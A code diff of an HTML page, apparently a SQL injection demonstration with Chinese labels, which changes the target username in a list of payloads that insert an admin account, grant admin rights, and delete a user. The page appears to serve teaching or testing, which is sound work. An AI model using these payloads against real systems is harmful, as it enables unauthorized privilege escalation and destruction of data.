@@ -59,12 +59,12 @@
         <button class="use" data-target="sqli-user" data-value="ADMIN'; INSERT INTO users(username,password,isAdmin) VALUES ('hacker','9999',1); -- ">填入帳號</button>
       </div>
       <div class="pl-item">
-        <div><div class="pl-label">3. 把 pony 設為管理員</div><div class="pl-code">'; UPDATE users SET isAdmin=1 WHERE username='pony'; -- </div></div>
-        <button class="use" data-target="sqli-user" data-value="'; UPDATE users SET isAdmin=1 WHERE username='pony'; -- ">填入帳號</button>
+        <div><div class="pl-label">3. 把 elaine 設為管理員</div><div class="pl-code">'; UPDATE users SET isAdmin=1 WHERE username='elaine'; -- </div></div>
+        <button class="use" data-target="sqli-user" data-value="'; UPDATE users SET isAdmin=1 WHERE username='elaine'; -- ">填入帳號</button>
       </div>
       <div class="pl-item">
-        <div><div class="pl-label">4. 刪除 pony</div><div class="pl-code">hacker'; DELETE FROM users WHERE username='pony'; -- </div></div>
-        <button class="use" data-target="sqli-user" data-value="hacker'; DELETE FROM users WHERE username='pony'; -- ">填入帳號</button>
+        <div><div class="pl-label">4. 刪除 elaine</div><div class="pl-code">hacker'; DELETE FROM users WHERE username='elaine'; -- </div></div>
+        <button class="use" data-target="sqli-user" data-value="hacker'; DELETE FROM users WHERE username='elaine'; -- ">填入帳號</button>
       </div>
     </div>
 
